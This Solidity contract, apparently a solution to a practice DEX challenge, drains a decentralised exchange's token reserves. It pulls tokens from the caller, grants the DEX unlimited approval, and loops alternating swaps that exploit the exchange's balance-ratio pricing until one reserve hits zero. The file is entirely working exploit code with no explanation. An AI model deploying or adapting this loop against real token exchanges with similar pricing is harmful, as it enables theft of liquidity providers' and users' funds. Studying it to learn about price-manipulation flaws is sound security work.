pragma solidity 0.8.19;

import "forge-std/console.sol";
import "src/Dex.sol";
import "openzeppelin-contracts/contracts/interfaces/IERC20.sol";

contract Exploit {
    function exploit(address _target) public {
        Dex d = Dex(_target);
        IERC20 token1 = IERC20(d.token1());
        IERC20 token2 = IERC20(d.token2());

        token1.transferFrom(msg.sender, address(this), 10);
        token2.transferFrom(msg.sender, address(this), 10);

        token1.approve(_target, type(uint256).max);
        token2.approve(_target, type(uint256).max);

        while (true) {
            uint256 dexToken1Balance = token1.balanceOf(_target);

            if (dexToken1Balance == 0) {
                break;
            } else {
                uint256 thisToken1Balance = token1.balanceOf(address(this));
                if (thisToken1Balance < dexToken1Balance) {
                    d.swap(address(token1), address(token2), thisToken1Balance);
                } else {
                    d.swap(address(token1), address(token2), dexToken1Balance);
                }
            }

            uint256 dexToken2Balance = token2.balanceOf(_target);
            if (dexToken2Balance == 0) {
                break;
            } else {
                uint256 thisToken2Balance = token2.balanceOf(address(this));
                if (thisToken2Balance < dexToken2Balance) {
                    d.swap(address(token2), address(token1), thisToken2Balance);
                } else {
                    d.swap(address(token2), address(token1), dexToken2Balance);
                }
            }
        }
    }
}
